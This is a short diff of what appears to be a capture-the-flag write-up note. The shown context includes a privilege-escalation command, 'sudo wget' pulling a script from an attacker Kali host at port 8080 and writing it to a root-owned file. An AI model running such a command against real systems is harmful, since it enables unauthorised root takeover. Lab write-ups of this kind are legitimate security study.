@@ -125,6 +125,8 @@ root
 
 /usr/bin/wget
 
+/root/troll
+
 ```
 vim writeup.sh
 ```
@@ -148,4 +150,7 @@ const command = `sudo wget ${KaliIP}:8080/writeup.sh -O /root/troll`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+---
+
 
